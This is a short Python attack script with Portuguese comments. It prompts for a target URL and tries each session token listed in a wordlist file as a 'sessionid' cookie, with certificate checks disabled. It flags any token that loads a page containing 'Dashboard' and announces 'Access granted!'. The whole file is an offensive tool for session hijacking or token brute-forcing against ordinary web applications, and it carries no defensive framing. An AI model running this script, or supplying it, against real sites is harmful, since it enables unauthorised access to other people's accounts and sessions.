import requests

# Solicita o alvo ao usuário
TARGET = input("Enter the target URL (e.g., https://example.com): ").strip()
DASHBOARD_PATH = "/"
WORDLIST_PATH = "tokens.txt"

HEADERS = {"User-Agent": "Mozilla/5.0", "Referer": f"{TARGET}/signin/"}

def test_token(token):
    """Testa se um token de sessão concede acesso"""
    cookies = {"sessionid": token}
    try:
        response = requests.get(f"{TARGET}{DASHBOARD_PATH}", headers=HEADERS, cookies=cookies, verify=False, timeout=5)
        if response.status_code == 200 and "Dashboard" in response.text:
            print(f"[+] Valid token: {token}")
            return True
    except requests.exceptions.RequestException:
        pass
    return False

print("\n[*] Update 'tokens.txt' with session tokens before running.")
input("Press Enter to continue...")

with open(WORDLIST_PATH, "r") as file:
    for token in file:
        if test_token(token.strip()):
            print("[!] Access granted!")
            break
